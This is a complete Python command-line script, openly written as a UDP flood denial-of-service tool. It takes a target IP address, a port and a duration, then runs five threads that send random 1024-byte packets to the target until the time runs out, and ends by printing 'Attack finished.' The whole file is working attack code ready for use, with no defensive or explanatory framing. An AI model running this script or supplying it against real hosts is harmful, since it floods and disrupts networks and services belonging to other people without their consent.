#!/usr/bin/env python3

import argparse
import random
import socket
import threading
import time

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-ti", "--time", type=int, default=60, help="Time duration for attack in seconds")
args = vars(ap.parse_args())

ip = args['ip']
port = args['port']
attack_time = args['time']

def udp_flood():
    data = random._urandom(1024)
    start_time = time.time()
    while (time.time() - start_time) < attack_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            s.sendto(data, addr)
        except socket.error as e:
            print("[#] Error: " + str(e))
        finally:
            s.close()

threads = []
for _ in range(5):
    th = threading.Thread(target=udp_flood)
    th.start()
    threads.append(th)

for th in threads:
    th.join()

print("Attack finished.")
